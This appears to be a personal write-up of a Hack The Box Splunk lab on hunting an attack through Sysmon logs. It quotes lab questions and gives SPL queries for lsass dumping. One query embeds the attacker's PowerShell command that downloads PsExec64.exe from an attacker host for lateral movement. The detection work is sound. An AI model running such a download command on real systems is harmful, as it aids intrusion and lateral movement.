# Splunk-Threat-Hunting-Finding-Evil-at-Scale
Hunted through 500,000+ events in Splunk across a compromised network. Traced a notepad-to-PowerShell attack chain, confirmed a DCSync attack, detected lsass credential dumping, and built alerts filtering UNKNOWN memory regions to identify shellcode while eliminating false positives.



Another interesting lab from HTB and learning to use Splunk's SPL's. The document for this lab is pretty self explanatory and helps to build a case. As I go farther and understand more I'm seeing that its like your a detective and you're trying to find the suspect. You start with a blank canvas and slowly build up to exactly where theyre hiding. With this one I was following along different queries until I found answer #1

So we're fine tuning each search as we get one bit of data. Event codes, then the processes that run, then the processes together that look suspicious, and different applications. 

For example the query I added to find the first question "


index="main" 10.0.0.229 sourcetype="WinEventLog:sysmon"  CommandLine="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -C Invoke-WebRequest -Uri http://10.0.0.229:8080/PsExec64.exe -OutFile PsExec64.exe"

What this query is doing in plain English:
It's looking for evidence that a machine ran a PowerShell command to download PsExec64 from the attacker-controlled Linux server. This is the lateral movement stage — the attacker already had a foothold and was pulling down tools to move across the network.


Q1. "Navigate to http://[Target IP]:8000, open the "Search & Reporting" application, and find through an SPL search against all data the other process that dumped lsass. Enter its name as your answer. Answer format: _.exe"

<img width="1036" height="636" alt="image" src="https://github.com/user-attachments/assets/0171acfc-9574-4843-8a78-3a637d6b06f9" />


Q2. "Navigate to http://[Target IP]:8000, open the "Search & Reporting" application, and find through SPL searches against all data the method through which the other process dumped lsass. Enter the misused DLL's name as your answer. Answer format: _.dll"

Following along the document I was able to find this query "index="main" EventCode=10 lsass | stats count by SourceImage" 

<img width="1477" height="236" alt="image" src="https://github.com/user-attachments/assets/872b02f0-c481-4216-baa1-41cc96a4e330" />


Which was correct but first I tried my own and created this "index="main" sourcetype="WinEventLog:sysmon" EventCode= 7 SourceImage"	C:\Windows\System32\rundll32.exe" and came back with nothing.
